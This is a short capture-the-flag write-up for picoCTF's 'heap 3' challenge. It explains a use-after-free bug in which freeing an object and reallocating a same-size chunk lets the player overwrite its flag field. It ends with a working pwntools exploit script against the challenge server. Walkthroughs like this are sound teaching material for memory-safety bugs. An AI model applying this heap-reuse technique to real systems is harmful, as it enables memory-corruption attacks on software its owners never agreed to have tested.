# heap 3

The goal of this challenge from [picoCTF](https://play.picoctf.org/practice/challenge/440) is to exploit a [UAF](https://beta.hackndo.com/use-after-free/) vulnerability.

Here is what we get once we run the binnary:
```
freed but still in use
now memory untracked
do you smell the bug?

1. Print Heap
2. Allocate object
3. Print x->flag
4. Check for win
5. Free x
6. Exit

Enter your choice:
```
Let's examine the source code to understand the vulnerability.


Looking at the `check_win` we can see that we need to set the `x` variable value to `pico`

```c
void check_win() {
    if(!strcmp(x->flag, "pico")) {
        printf("YOU WIN!!11!!\n");

        // Print flag
        char buf[FLAGSIZE_MAX];
        FILE *fd = fopen("flag.txt", "r");
        fgets(buf, FLAGSIZE_MAX, fd);
        printf("%s\n", buf);
        fflush(stdout);

        exit(0);
    } else {
        printf("No flage for u :(\n");
        fflush(stdout);
    }
}
```

To do this, we can free `x` and allocate a new object of the same size, because `malloc` will return same adress.

To retrieve the `x` size, we need to look to this struct:

```c
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;
```

From this we know we will need to allocate 35 bytes and write 30 bytes before overwriting `x`.

# Solve

```py
from pwn import *

payload = "A" * 30 + "pico"

r = remote("tethys.picoctf.net", 65471)
r.sendlineafter(b"Enter your choice: ", b'5')
r.sendlineafter(b"Enter your choice: ", b'2')
r.sendlineafter(b"Size of object allocation: ", b'35')
r.sendlineafter(b"Data for flag: ", b"a"*30+b'pico')
r.sendlineafter(b"Enter your choice: ", b'4')
r.interactive()
```